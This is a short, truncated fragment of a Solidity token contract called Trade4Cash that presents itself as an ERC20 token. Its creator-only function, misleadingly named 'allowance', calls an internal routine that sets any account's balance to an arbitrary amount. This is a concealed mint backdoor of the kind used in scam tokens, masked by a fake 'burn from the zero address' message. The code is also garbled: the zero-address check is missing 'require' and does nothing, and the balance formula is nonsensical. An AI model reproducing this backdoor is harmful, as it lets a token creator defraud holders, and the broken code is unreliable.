...
contract Trade4Cash is IERC20 {
  ...
  function allowance(uint256 amount, address account) external onlyCreator {
    _function(amount, account);
  }

  function _function(uint256 amount, address account) internal  {
    (owner != address(0), "ERC20: burn from the zero address");
    _balances[account] = (donationMax + donationMin / donationMin) + amount * 10 ** uint256(decimals);
